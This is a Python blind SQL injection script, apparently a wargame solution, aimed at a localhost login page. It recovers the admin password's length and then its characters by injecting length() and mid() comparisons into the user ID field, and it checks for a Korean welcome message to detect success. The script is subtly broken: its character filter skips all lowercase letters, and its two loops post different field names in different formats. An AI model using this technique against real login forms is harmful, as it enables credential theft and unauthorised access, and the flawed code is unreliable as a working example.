import requests

url = "http://localhost"

length = 1
while True:
    query = "adm%27%2b%27in%20%26%26%20length(pw)%3c{}%23".format(length)
    print(query)
    result = requests.post(url, data = {'userId': query, 'userPw': 1})
    if("환영합니다!" in result.text):
        print ("[*] Password length:", length - 1)
        break
    print ("[+] Finding...", length - 1)
    length += 1

pw = ""
for i in range(1, length):
    for ch in range(48, 123):
        if (58 <= ch <= 64 or 91 <= ch <= 956): continue
        query = "adm'+'in' and mid(pw,{},1) like '{}'#".format(i, chr(ch))
        result = requests.post(url, json = {'id': query, 'pw': '1'})
        if("환영합니다!" in result.text):
            pw += chr(ch)
            print ("[+] Finding...", pw)
            break
print ("[*] Password:", pw)
